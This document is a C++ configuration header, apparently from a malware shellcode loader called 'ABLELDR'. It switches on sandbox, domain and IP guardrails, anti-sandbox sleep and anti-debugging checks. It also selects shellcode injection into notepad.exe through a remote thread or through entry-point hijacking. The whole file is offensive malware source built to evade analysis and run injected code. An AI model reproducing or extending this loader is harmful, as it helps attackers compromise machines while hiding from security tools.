#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK 1

// Anti Sandbox
#define ANTI_SANDBOX_ENABLED 1
#define SLEEP_ENABLED 1
#define SLEEP_METHOD 1

// Anti Debugging
#define DEBUG_IS_BEING_DEBUGGED 1
#define DEBUG_REMOTE_DEBUGGING 1

// Execution Methods
#define CONFIG_EXECUTION_METHOD 1
#define CONFIG_EXECUTION_TARGET_PID 9064
#define CONFIG_EXECUTION_TARGET_NAME "notepad.exe"

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode) execute::CreateRemoteThread(phandle, shellcode)
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode) execute::HijackEntryPoint(phandle, shellcode)
#endif

#endif